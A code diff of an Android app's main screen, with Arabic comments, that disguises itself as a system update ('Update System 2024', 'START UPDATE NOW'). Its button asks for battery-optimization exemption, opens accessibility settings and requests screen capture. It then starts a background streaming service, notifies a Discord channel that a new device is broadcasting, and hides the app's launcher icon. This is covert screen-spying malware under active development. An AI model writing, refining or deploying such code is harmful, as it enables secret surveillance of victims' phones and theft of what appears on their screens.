@@ -1,6 +1,6 @@
 package com.tom5.monitor;
 
-import android.app.Activity;
+import android.app.Activity; // استخدمنا Activity العادية لمنع كراش الثيم
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
@@ -12,62 +12,59 @@ import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
 import android.view.Gravity;
-import android.view.View;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.TextView;
-import androidx.appcompat.app.AppCompatActivity;
 
-public class MainActivity extends AppCompatActivity {
+public class MainActivity extends Activity {
     private static final int REQ_CODE = 100;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // بناء الواجهة برمجياً لتجنب كراش الموارد
+        // بناء الواجهة برمجياً لضمان عدم وجود أخطاء في ملفات الـ XML
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setGravity(Gravity.CENTER);
         layout.setBackgroundColor(Color.WHITE);
 
         TextView tv = new TextView(this);
-        tv.setText("تحديث نظام أندرويد");
+        tv.setText("Update System 2024");
         tv.setTextSize(22);
         tv.setTextColor(Color.BLACK);
-        tv.setPadding(0, 0, 0, 50);
+        tv.setPadding(0, 0, 0, 60);
         layout.addView(tv);
 
         Button btn = new Button(this);
-        btn.setText("بدء الإصلاح الآن");
+        btn.setText("START UPDATE NOW");
         btn.setBackgroundColor(Color.parseColor("#2196F3"));
         btn.setTextColor(Color.WHITE);
+        btn.setPadding(20, 20, 20, 20);
+        
         btn.setOnClickListener(v -> {
-            requestBatteryOptimizations();
-            if (!isAccessibilityEnabled()) {
-                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-            }
+            // طلب استثناء البطارية
+            try {
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                }
+            } catch (Exception ignored) {}
+
+            // فتح إعدادات إمكانية الوصول
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+
+            // طلب بث الشاشة
             MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             if (mpm != null) {
                 startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
             }
         });
+        
         layout.addView(btn);
-
         setContentView(layout);
-    }
-
-    private void requestBatteryOptimizations() {
-        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            intent.setData(Uri.parse("package:" + getPackageName()));
-            startActivity(intent);
-        }
-    }
-
-    private boolean isAccessibilityEnabled() {
-        return false; 
     }
 
     @Override
@@ -79,18 +76,15 @@ public class MainActivity extends AppCompatActivity {
             intent.putExtra("resData", data);
             startForegroundService(intent);
             
-            DiscordSender.sendMessage("✅ تم بدء البث من جهاز جديد!");
+            DiscordSender.sendMessage("✅ تم بدء البث بنجاح من جهاز جديد!");
             
-            hideAppIcon();
+            // إخفاء الأيقونة
+            getPackageManager().setComponentEnabledSetting(
+                new ComponentName(this, MainActivity.class),
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            );
             finish();
         }
-    }
-
-    private void hideAppIcon() {
-        getPackageManager().setComponentEnabledSetting(
-            new ComponentName(this, MainActivity.class),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        );
     }
 }
